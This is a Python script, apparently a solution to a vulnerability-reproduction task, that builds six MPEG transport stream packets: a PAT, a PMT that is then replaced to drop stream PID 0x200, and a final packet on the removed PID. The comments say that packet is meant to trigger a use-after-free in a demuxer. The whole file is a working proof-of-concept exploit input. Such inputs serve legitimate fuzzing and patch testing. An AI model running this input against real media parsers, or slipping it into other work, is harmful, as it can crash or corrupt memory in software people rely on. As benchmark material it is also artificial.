import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        TS_SIZE = 188
        SYNC_BYTE = 0x47

        def crc32_mpeg(data):
            crc = 0xFFFFFFFF
            for byte in data:
                for i in range(7, -1, -1):
                    bit = (byte >> i) & 1
                    msb = (crc >> 31) & 1
                    crc = (crc << 1) & 0xFFFFFFFF
                    if msb ^ bit:
                        crc ^= 0x04C11DB7
            return crc

        def make_ts_packet(pid, payload, counter, pusi=False):
            header = bytearray(4)
            header[0] = SYNC_BYTE
            val = (pid & 0x1FFF)
            if pusi:
                val |= 0x4000
            header[1] = (val >> 8) & 0xFF
            header[2] = val & 0xFF
            header[3] = 0x10 | (counter & 0x0F)
            
            # Pad payload to 184 bytes with 0xFF
            if len(payload) < 184:
                payload = payload + b'\xff' * (184 - len(payload))
            elif len(payload) > 184:
                payload = payload[:184]
            return header + payload

        # Packet 1: PAT
        # Program 1 -> PID 0x100
        # Section Len = 13 (Header 8 + Loop 4 + CRC 4 - 3)
        # ID=0, Len=13, TSID=1, Ver=0, CN=1, Prog=1, PID=0x100
        pat_data = bytearray()
        pat_data += b'\x00' # Table ID
        pat_data += b'\xB0\x0D' # Section Len (Syntax=1, Res=3, Len=13)
        pat_data += struct.pack('>H', 1) # TSID
        pat_data += b'\xC1\x00\x00' # Res=3, Ver=0, CN=1, Sec=0, Last=0
        pat_data += struct.pack('>H', 1) # Prog 1
        pat_data += struct.pack('>H', 0xE100) # PID 0x100
        
        crc_pat = crc32_mpeg(pat_data)
        pat_section = pat_data + struct.pack('>I', crc_pat)
        # PSI pointer field = 0
        pkt1 = make_ts_packet(0, b'\x00' + pat_section, 0, pusi=True)

        # Packet 2: PMT v0
        # Program 1, PID 0x100. Stream PID 0x200 (AAC)
        # Section Len = 18 (Header 8 + PCR 2 + ProgInfo 2 + Stream 5 + CRC 4 - 3)
        pmt0_data = bytearray()
        pmt0_data += b'\x02' # Table ID
        pmt0_data += b'\xB0\x12' # Len 18
        pmt0_data += struct.pack('>H', 1) # Prog 1
        pmt0_data += b'\xC1\x00\x00' # Ver 0
        pmt0_data += struct.pack('>H', 0xE200) # PCR PID 0x200
        pmt0_data += struct.pack('>H', 0xF000) # Prog Info Len 0
        pmt0_data += b'\x0F' # Stream Type AAC
        pmt0_data += struct.pack('>H', 0xE200) # Elem PID 0x200
        pmt0_data += struct.pack('>H', 0xF000) # ES Info Len 0
        
        crc_pmt0 = crc32_mpeg(pmt0_data)
        pmt0_section = pmt0_data + struct.pack('>I', crc_pmt0)
        pkt2 = make_ts_packet(0x100, b'\x00' + pmt0_section, 0, pusi=True)

        # Packet 3: PES Data on 0x200 (Create state for ES)
        # Start a PES packet.
        pes_head = b'\x00\x00\x01\xC0\x00\x64' # PES Start, Audio, Len 100
        pkt3 = make_ts_packet(0x200, pes_head + b'\xAA'*100, 0, pusi=True)

        # Packet 4: PMT v1 (Trigger deletion of ES 0x200)
        # Remove 0x200, Add 0x300.
        # Section Len = 18
        pmt1_data = bytearray()
        pmt1_data += b'\x02'
        pmt1_data += b'\xB0\x12'
        pmt1_data += struct.pack('>H', 1)
        pmt1_data += b'\xC3\x00\x00' # Ver 1 (0xC1 | (1<<1) = 0xC3)
        pmt1_data += struct.pack('>H', 0xE300) # PCR PID 0x300
        pmt1_data += struct.pack('>H', 0xF000)
        pmt1_data += b'\x0F'
        pmt1_data += struct.pack('>H', 0xE300) # Elem PID 0x300
        pmt1_data += struct.pack('>H', 0xF000)
        
        crc_pmt1 = crc32_mpeg(pmt1_data)
        pmt1_section = pmt1_data + struct.pack('>I', crc_pmt1)
        pkt4 = make_ts_packet(0x100, b'\x00' + pmt1_section, 1, pusi=True)

        # Packet 5: Data on 0x300 (Valid new stream)
        pkt5 = make_ts_packet(0x300, b'\xBB'*100, 0, pusi=True)

        # Packet 6: Data on 0x200 (Trigger Access After Free if mapping lingers)
        pkt6 = make_ts_packet(0x200, b'\xCC'*100, 1, pusi=False)

        return pkt1 + pkt2 + pkt3 + pkt4 + pkt5 + pkt6